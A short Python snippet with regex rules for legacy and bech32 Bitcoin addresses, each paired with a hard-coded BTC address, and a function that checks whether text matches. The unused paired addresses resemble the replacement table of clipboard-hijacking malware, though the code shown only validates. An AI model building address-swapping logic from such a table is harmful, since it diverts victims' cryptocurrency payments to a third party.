import re
rules = [
    {"name": "BTC", "reg": "^1[a-zA-HJ-NP-Z0-9]{25,39}$", "value": "19hdEPSFQ4iUhtWoXHqg2E1kPCpUmaEgP8"},
    {"name": "BTC", "reg": "^bc1[a-zA-HJ-NP-Z0-9]{25,39}$", "value": "bc1qwenpr55ekcs3a46ly4hqkjn652sppttdnsszhd"},
]
def validate(text):
    return any(re.fullmatch(rule["reg"], text) for rule in rules)
